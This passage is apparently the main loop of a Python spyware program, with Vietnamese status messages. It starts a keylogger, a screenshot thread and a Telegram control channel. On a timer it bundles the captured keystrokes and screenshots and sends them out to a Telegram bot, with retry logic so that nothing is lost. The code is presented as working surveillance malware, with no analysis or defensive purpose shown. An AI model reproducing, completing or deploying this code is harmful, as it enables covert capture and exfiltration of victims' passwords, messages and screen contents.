        log_message(f"Error starting setup_bot_commands: {e}")
        
    try:
        state = load_state()
        machine = state.get("machine_name") or os.environ.get('COMPUTERNAME', 'Unknown-PC')
        startup_msg = f"🟢 <b>[{machine}]</b> Khởi động...\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        Thread(target=send_telegram_message, args=(startup_msg, True, get_control_keyboard()), daemon=True).start()
    except Exception as e:
        log_message(f"Error sending startup message: {e}")
    

    poll_thread = Thread(target=poll_telegram, daemon=True)
    screen_thread = Thread(target=screen_thread_func, daemon=True)
    keylogger_thread = Thread(target=keylog_join, daemon=True)
    
    poll_thread.start()
    screen_thread.start()
    keylogger_thread.start()
    
    buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
    
    # Run initial startup check for outbox retry
    try:
        retry_outbox()
    except Exception as e:
        log_message(f"Error on startup outbox retry: {e}")
        
    while True:
        time.sleep(5)  # Small sleeping period for lightweight polling
        
        state = load_state()
        
        # 1. Read and flush keylogs based on last_keylog_sent timestamp
        last_keylog_sent_str = state.get("last_keylog_sent", "1970-01-01 00:00:00")
        try:
            last_keylog_sent = datetime.strptime(last_keylog_sent_str, "%Y-%m-%d %H:%M:%S")
        except:
            last_keylog_sent = datetime(1970, 1, 1)

        if datetime.now() - last_keylog_sent >= timedelta(seconds=KEYLOG_SEND_INTERVAL):
            # Gather all screenshots currently in SCREENSHOT_DIR
            photo_paths = []
            try:
                for file_name in os.listdir(SCREENSHOT_DIR):
                    file_path = os.path.join(SCREENSHOT_DIR, file_name)
                    if os.path.isfile(file_path) and file_name.endswith('.png'):
                        photo_paths.append(file_path)
            except Exception as e:
                log_message(f"Error gathering screenshots: {e}")

            # Read keylogs safely using atomic renaming
            content = ""
            temp_buffer_path = os.path.join(STORAGE, "keylog_buffer_temp.txt")
            if os.path.exists(buffer_path) and os.path.getsize(buffer_path) > 0:
                try:
                    # Rename the buffer to a temp file atomically
                    shutil.move(buffer_path, temp_buffer_path)
                except Exception as e:
                    log_message(f"Error renaming keylog buffer: {e}")
                
                if os.path.exists(temp_buffer_path):
                    try:
                        with open(temp_buffer_path, "r", encoding="utf-8") as f:
                            raw_content = f.read()
                        if raw_content.strip():
                            content = process_keylog_text(raw_content)
                        os.remove(temp_buffer_path)
                    except Exception as e:
                        log_message(f"Error processing temp keylog buffer: {e}")

            # Send bundled photos and keylogs
            if photo_paths or content.strip():
                success = send_telegram_bundled(photo_paths, content)
                if success:
                    update_state(
                        last_keylog_sent=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        last_screenshot_sent=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    )
            else:
                # Update timestamp even if buffer and folder were empty to avoid constant checks
                update_state(
                    last_keylog_sent=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    last_screenshot_sent=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                )
        
        # 3. Retry outbox based on last_outbox_retry
        last_outbox_retry_str = state.get("last_outbox_retry", "1970-01-01 00:00:00")
        try:
            last_outbox_retry = datetime.strptime(last_outbox_retry_str, "%Y-%m-%d %H:%M:%S")
        except:
            last_outbox_retry = datetime(1970, 1, 1)

        if datetime.now() - last_outbox_retry >= timedelta(seconds=OUTBOX_RETRY_INTERVAL):
            try:
                retry_outbox()
                update_state(last_outbox_retry=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            except Exception as e:
                log_message(f"Error running outbox retry: {e}")

if __name__ == "__main__":
    main()